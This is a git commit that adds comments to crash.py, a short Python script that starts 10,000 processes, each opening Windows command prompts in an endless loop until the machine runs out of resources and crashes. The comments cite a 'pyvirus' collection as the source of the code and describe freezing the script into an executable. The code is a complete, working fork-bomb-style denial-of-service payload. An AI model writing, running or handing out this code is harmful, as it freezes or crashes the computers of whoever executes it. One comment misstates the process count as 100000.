5e31538331814896cdd6bcde545b16603d447b24
dreysimp <92762249+dreysimp@users.noreply.github.com>
2022-11-17 19:34:35 -0800

    commented the code

--- crash.py
+++ crash.py
@@ -1,20 +1,25 @@
-from multiprocessing import Process
-from multiprocessing import freeze_support
-import os
+#https://github.com/palahsu/pyvirus/blob/main/Python%20Virus%20List/pyvirus%203.py
+#this github is where I found the code for opening the command prompt in a while loop
+#https://superfastpython.com/multiprocessing-in-python/
+#this website is where I learned about multiprocessing in python
+
+from multiprocessing import Process                         #import Process from multiprocessing library
+from multiprocessing import freeze_support                  #import freeze_support from multiprocessing library
+import os                                                   #import operating system library
 
 
-def cmd():
+def cmd():                                                  #method for infinitely opening command prompts for the given operating system
     while True:
         a = os.system('start cmd')
 
 
-processes = []
+processes = []                                              #array to store each child process created
 if __name__ == '__main__':
-    freeze_support()
-    for i in range(10000):
-        first = Process(target=cmd)
-        first.start()
-        processes.append(first)
+    freeze_support()                                        #allows multiprocessing once the python file is freezed in the executable
+    for i in range(10000):                                  #for loop to create 100000 child processes
+        first = Process(target=cmd)                         #create child process where we call the cmd method
+        first.start()                                       #start the child process
+        processes.append(first)                             #append the child process to the list
 
-    for process in processes:
+    for process in processes:                               #loops the array and joins each child process so that they don't block eachother
         process.join()
